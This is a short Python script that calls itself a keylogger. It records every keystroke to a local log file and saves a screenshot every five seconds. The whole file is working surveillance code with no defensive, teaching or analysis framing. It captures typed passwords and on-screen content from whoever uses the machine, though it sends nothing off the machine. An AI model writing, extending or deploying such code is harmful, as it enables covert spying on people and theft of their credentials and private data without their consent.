import os
from datetime import datetime

#keyboard module
from pynput import keyboard
from pynput.keyboard import Listener
import logging

#screenshot module
import mss
import threading
import time

#create or open log file
log_file_path = "key_log.txt"
log_file = open(log_file_path, "a") # 'a' = append mode

#create screenshot directory
screenshot_dir = "screenshots"
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

#logging:configuring logging to append the keystrokes to the file
log_file = "key_log.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format = '%(asctime)s:%(message)s'
     )
def on_press(key):
    try:
        #Record alphanumeric keys
        logging.info(f"Key pressed is:{key.char}")
    except AttributeError:
        #Record special keys
        logging.info(f"Special Character:{key}")

#start the listener
listener  = keyboard.Listener(on_press=on_press)
listener.start()

#screenshot functionality
def take_screenshot():
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    filename = os.path.join(screenshot_dir,f"screenshot_{timestamp}.png")

    with mss.mss() as sct:
        sct.shot(output=filename)

def screenshot_loop():
    while True:
        take_screenshot()
        time.sleep(5)

screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
screenshot_thread.start()

if __name__ == "__main__":
    print("[*] Keylogger and screenshot threads running... Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Logger stopped by user.")

